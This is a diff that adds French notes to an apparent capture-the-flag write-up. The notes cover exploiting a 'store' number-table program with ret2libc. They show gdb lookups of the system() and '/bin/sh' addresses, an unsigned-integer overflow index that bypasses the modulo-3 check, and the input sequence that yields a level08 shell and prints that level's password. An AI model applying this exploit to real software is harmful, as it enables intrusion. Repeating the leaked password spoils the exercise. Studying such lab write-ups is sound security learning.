@@ -76,3 +76,34 @@ $10 = 114
 (gdb)
 ```
 
+Trouver toutes les adresses nécessaires pour faire la ret2libc
+```sh
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+```
+En decimal ça nous donnes:
+ - system = 4159090384
+ - /bin/sh = 4160264172
+ - et l'offset de eip = 114
+
+Malheureusement 114 modulo 3 n'est pas égal à 0 donc on va devoir trouver un moyen d'écrire à 114. Donc on peut overflow ou underflow l'int.
+
+Comme l'index fournit est un int mais que le stockage est un unsigned int on doit diviser par 4 le resultat de l'overflow (2^32 / 4) + 114
+
+```
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
